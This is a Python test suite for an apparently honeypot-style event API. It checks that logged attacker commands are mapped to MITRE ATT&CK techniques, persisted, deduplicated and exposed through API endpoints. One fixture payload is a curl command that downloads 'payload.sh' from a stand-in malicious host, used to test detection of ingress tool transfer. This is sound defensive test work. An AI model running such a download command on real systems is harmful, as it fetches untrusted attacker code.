"""
Comprehensive Automated Test Script for MITRE ATT&CK Mapping & Evidence Tracking.
Covers Tests 1-10 per Command 4 Phase 6 requirements.
"""

import httpx
import json
import time
from datetime import datetime, timezone, timedelta

BASE_URL = "http://127.0.0.1:8000"

def run_tests():
    print("===================================================================")
    print("MITRE ATT&CK TECHNIQUE MAPPING & EVIDENCE TRACKING TEST SUITE")
    print("===================================================================")

    now = datetime.now(timezone.utc)
    ts = int(time.time())

    # --- Test 1: Known supported event patterns ---
    print("\n[Test 1] Testing known supported event patterns...")
    
    # 1a. User discovery: whoami -> T1033
    evt_user_disc_id = f"evt-mitre-whoami-{ts}"
    res_user = httpx.post(f"{BASE_URL}/api/events", json={
        "event_id": evt_user_disc_id,
        "source_ip": "198.51.100.201",
        "event_type": "command_execution",
        "payload": "whoami && id",
        "data_origin": "synthetic"
    })
    assert res_user.status_code in [200, 201]
    evt_user_data = res_user.json()
    assert evt_user_data["mitre_technique_id"] == "T1033"
    assert evt_user_data["mitre_technique_name"] == "System Owner/User Discovery"
    print(f" -> Pattern 'whoami' correctly mapped to {evt_user_data['mitre_technique_id']} ({evt_user_data['mitre_technique_name']})")

    # 1b. Ingress tool transfer: curl -> T1105
    evt_tool_id = f"evt-mitre-curl-{ts}"
    res_tool = httpx.post(f"{BASE_URL}/api/events", json={
        "event_id": evt_tool_id,
        "source_ip": "198.51.100.202",
        "event_type": "command_execution",
        "payload": "curl -O http://malicious.decor/payload.sh",
        "data_origin": "synthetic"
    })
    assert res_tool.status_code in [200, 201]
    evt_tool_data = res_tool.json()
    assert evt_tool_data["mitre_technique_id"] == "T1105"
    assert evt_tool_data["mitre_technique_name"] == "Ingress Tool Transfer"
    print(f" -> Pattern 'curl' correctly mapped to {evt_tool_data['mitre_technique_id']} ({evt_tool_data['mitre_technique_name']})")

    # 1c. Cron persistence: crontab -> T1053.003
    evt_cron_id = f"evt-mitre-cron-{ts}"
    res_cron = httpx.post(f"{BASE_URL}/api/events", json={
        "event_id": evt_cron_id,
        "source_ip": "198.51.100.203",
        "event_type": "command_execution",
        "payload": "crontab -e",
        "data_origin": "synthetic"
    })
    assert res_cron.status_code in [200, 201]
    evt_cron_data = res_cron.json()
    assert evt_cron_data["mitre_technique_id"] == "T1053.003"
    print(f" -> Pattern 'crontab' correctly mapped to {evt_cron_data['mitre_technique_id']}")

    # --- Test 2: Events that do NOT support a technique mapping ---
    print("\n[Test 2] Testing events that do NOT support a technique mapping...")
    evt_unmapped_id = f"evt-mitre-unmapped-{ts}"
    res_unmap = httpx.post(f"{BASE_URL}/api/events", json={
        "event_id": evt_unmapped_id,
        "source_ip": "203.0.113.111",
        "event_type": "ping",
        "payload": "ICMP echo request",
        "data_origin": "synthetic"
    })
    assert res_unmap.status_code in [200, 201]
    evt_unmap_data = res_unmap.json()
    assert evt_unmap_data["mitre_technique_id"] is None
    assert evt_unmap_data["confidence_score"] == 0.0
    print(" -> Generic ping event correctly unmapped (mitre_technique_id is None, NOT defaulted to exploit).")

    # Also test isolated login failure: should NOT be mapped to brute-force
    evt_single_auth_id = f"evt-single-fail-{ts}"
    res_single_auth = httpx.post(f"{BASE_URL}/api/events", json={
        "event_id": evt_single_auth_id,
        "source_ip": "203.0.113.112",
        "event_type": "auth_failed",
        "username": "user1",
        "payload": "login failure",
        "data_origin": "synthetic"
    })
    assert res_single_auth.status_code in [200, 201]
    single_auth_data = res_single_auth.json()
    assert single_auth_data["mitre_technique_id"] is None
    print(" -> Isolated login failure correctly not mapped as confirmed brute force.")

    # --- Test 3: Missing optional evidence fields ---
    print("\n[Test 3] Testing missing optional evidence fields handled safely...")
    evt_empty_id = f"evt-mitre-empty-{ts}"
    res_empty = httpx.post(f"{BASE_URL}/api/events", json={
        "event_id": evt_empty_id,
        "source_ip": "198.51.100.205",
        "event_type": "connection_closed"
        # payload, username, ports, honeypot_id omitted
    })
    assert res_empty.status_code in [200, 201]
    empty_data = res_empty.json()
    assert empty_data["mitre_technique_id"] is None
    print(" -> Safely handled missing fields without throwing exceptions.")

    # --- Test 4: Correct technique IDs and names against authoritative catalog ---
    print("\n[Test 4] Testing authoritative catalog technique IDs and names...")
    techs_res = httpx.get(f"{BASE_URL}/api/techniques")
    assert techs_res.status_code == 200
    catalog_list = techs_res.json()
    assert len(catalog_list) >= 10
    catalog_dict = {t["technique_id"]: t for t in catalog_list}

    # Verify official names
    assert catalog_dict["T1033"]["name"] == "System Owner/User Discovery"
    assert catalog_dict["T1082"]["name"] == "System Information Discovery"
    assert catalog_dict["T1059.004"]["name"] == "Command and Scripting Interpreter: Unix Shell"
    assert catalog_dict["T1105"]["name"] == "Ingress Tool Transfer"
    assert catalog_dict["T1053.003"]["name"] == "Scheduled Task/Job: Cron"
    assert catalog_dict["T1046"]["name"] == "Network Service Discovery"
    print(f" -> Authoritative catalog verified across {len(catalog_list)} official techniques.")

    # --- Test 5: Event-level mapping persistence ---
    print("\n[Test 5] Testing event-level mapping persistence in database...")
    ev_tech_res = httpx.get(f"{BASE_URL}/api/events/{evt_user_disc_id}/techniques")
    assert ev_tech_res.status_code == 200
    ev_tech_data = ev_tech_res.json()
    assert len(ev_tech_data) >= 1
    mapping = ev_tech_data[0]
    assert mapping["technique_id"] == "T1033"
    assert mapping["mapping_status"] == "supported"
    assert mapping["evidence_strength"] == "high"
    assert mapping["mapping_rule"] == "RULE_USER_DISCOVERY"
    assert "whoami" in mapping["explanation"]
    print(f" -> Event mapping persisted: rule={mapping['mapping_rule']}, status={mapping['mapping_status']}")

    # --- Test 6: Session-level mapping aggregation ---
    print("\n[Test 6] Testing session-level mapping aggregation...")
    session_id = f"mitre-agg-sess-{ts}"
    # Ingest 3 distinct commands into the same session
    httpx.post(f"{BASE_URL}/api/events", json={
        "event_id": f"evt-sess-whoami-{ts}",
        "session_id": session_id,
        "source_ip": "198.51.100.220",
        "event_type": "command_execution",
        "payload": "whoami",
        "data_origin": "synthetic"
    })
    httpx.post(f"{BASE_URL}/api/events", json={
        "event_id": f"evt-sess-uname-{ts}",
        "session_id": session_id,
        "source_ip": "198.51.100.220",
        "event_type": "command_execution",
        "payload": "uname -a",
        "data_origin": "synthetic"
    })

    # Trigger session technique retrieval / analysis
    sess_tech_res = httpx.get(f"{BASE_URL}/api/sessions/{session_id}/techniques")
    assert sess_tech_res.status_code == 200
    sess_techs = sess_tech_res.json()
    assert len(sess_techs) >= 2
    sess_tech_ids = [st["technique_id"] for st in sess_techs]
    assert "T1033" in sess_tech_ids
    assert "T1082" in sess_tech_ids
    print(f" -> Session aggregated {len(sess_techs)} distinct techniques: {sess_tech_ids}")

    # --- Test 7: Duplicate mapping prevention ---
    print("\n[Test 7] Testing duplicate mapping prevention...")
    # Add another whoami command to the same session
    httpx.post(f"{BASE_URL}/api/events", json={
        "event_id": f"evt-sess-whoami2-{ts}",
        "session_id": session_id,
        "source_ip": "198.51.100.220",
        "event_type": "command_execution",
        "payload": "whoami",
        "data_origin": "synthetic"
    })
    sess_tech_res_2 = httpx.get(f"{BASE_URL}/api/sessions/{session_id}/techniques")
    sess_techs_2 = sess_tech_res_2.json()
    t1033_instances = [t for t in sess_techs_2 if t["technique_id"] == "T1033"]
    assert len(t1033_instances) == 1, "Duplicate technique mapping created for T1033"
    # Verify supporting event IDs are aggregated and deduplicated
    sup_ids = t1033_instances[0]["supporting_event_ids"]
    assert len(sup_ids) == 2
    assert len(sup_ids) == len(set(sup_ids))
    print(f" -> Duplicate prevention verified: T1033 retained single entry with {len(sup_ids)} supporting events.")

    # --- Test 8: Technique API endpoints responses ---
    print("\n[Test 8] Testing all technique API endpoints...")
    # GET /api/techniques
    r1 = httpx.get(f"{BASE_URL}/api/techniques")
    assert r1.status_code == 200

    # GET /api/techniques/{technique_id}
    r2 = httpx.get(f"{BASE_URL}/api/techniques/T1033")
    assert r2.status_code == 200
    r2_data = r2.json()
    assert r2_data["technique_id"] == "T1033"
    assert r2_data["supporting_events_count"] >= 2
    assert len(r2_data["supporting_event_ids"]) >= 2

    # GET /api/techniques/non-existent
    r3 = httpx.get(f"{BASE_URL}/api/techniques/T9999.999")
    assert r3.status_code == 404

    # GET /api/events/{event_id}/techniques
    r4 = httpx.get(f"{BASE_URL}/api/events/{evt_user_disc_id}/techniques")
    assert r4.status_code == 200

    # GET /api/sessions/{session_id}/techniques
    r5 = httpx.get(f"{BASE_URL}/api/sessions/{session_id}/techniques")
    assert r5.status_code == 200

    # POST /api/analysis/mitre/run
    r6 = httpx.post(f"{BASE_URL}/api/analysis/mitre/run")
    assert r6.status_code == 200
    r6_data = r6.json()
    assert r6_data["evaluated_events"] > 0
    assert r6_data["mapped_events"] > 0
    print(f" -> All technique API endpoints validated with HTTP 200 / 404 responses.")

    # --- Test 9: Frontend integration verification ---
    print("\n[Test 9] Verifying frontend connectivity to /api/techniques...")
    techs_fe = httpx.get(f"{BASE_URL}/api/techniques?has_evidence=true").json()
    print(f" -> Found {len(techs_fe)} active techniques with evidence for frontend rendering.")

    # --- Test 10: Existing ingestion and session tests ---
    print("\n[Test 10] Verifying existing ingestion and session endpoints still function...")
    single_ingest = httpx.post(f"{BASE_URL}/api/events", json={
        "source_ip": "192.0.2.222",
        "event_type": "port_scan",
        "payload": "SYN Sweep"
    })
    assert single_ingest.status_code in [200, 201]

    bulk_ingest = httpx.post(f"{BASE_URL}/api/events/bulk", json={
        "events": [
            {"source_ip": "192.0.2.223", "event_type": "ping", "payload": "ping"},
            {"source_ip": "192.0.2.224", "event_type": "ping", "payload": "ping"}
        ]
    })
    assert bulk_ingest.status_code in [200, 201]
    assert bulk_ingest.json()["ingested"] == 2

    sessions_res = httpx.get(f"{BASE_URL}/api/sessions?limit=5")
    assert sessions_res.status_code == 200
    print(" -> Ingestion, bulk ingestion, and session endpoints remain fully operational.")

    print("\n===================================================================")
    print("ALL 10 MITRE ATT&CK MAPPING & EVIDENCE TESTS PASSED SUCCESSFULLY!")
    print("===================================================================")

if __name__ == "__main__":
    run_tests()
